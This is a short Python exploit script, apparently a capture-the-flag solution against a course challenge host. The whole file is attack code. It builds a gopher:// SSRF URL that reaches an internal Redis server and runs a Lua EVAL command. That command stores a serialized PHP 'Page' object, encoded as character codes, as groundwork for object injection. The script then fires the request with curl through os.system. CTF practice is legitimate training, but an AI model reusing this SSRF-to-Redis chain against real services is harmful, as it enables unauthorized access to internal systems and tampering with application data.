"""
Paste the integer array from create_string.py to string.char() in the lua_script variable.
Then we send the curl request with this script.
"""
import urllib.parse
import os

domain = "http://edu-ctf.zoolab.org:10099/create"
gopher_url = "gopher://redis:6379/_"
lua_script = 'EVAL "local key = \'abc\'; local url = string.char(79,58,52,58,34,80,97,103,101,34,58,51,58,123,115,58,51,58,34,117,114,108,34,59,115,58,49,54,58,34,104,116,116,112,58,47,47,121,97,104,111,111,46,99,111,109,34,59,115,58,49,49,58,34,0,80,97,103,101,0,116,105,116,108,101,34,59,115,58,49,49,58,34,77,89,32,84,73,84,76,69,69,69,69,34,59,115,58,49,51,58,34,0,80,97,103,101,0,112,114,101,118,105,101,119,34,59,115,58,49,55,58,34,60,115,99,114,105,112,116,62,60,47,115,99,114,105,112,116,62,34,59,125);return redis.call(\'SET\', key, url);" 0'
print(lua_script)
lua_script = urllib.parse.quote(lua_script)
gopher_url += lua_script
gopher_url = urllib.parse.quote(gopher_url)
print(gopher_url)
os.system(f"curl {domain} --data url={gopher_url}")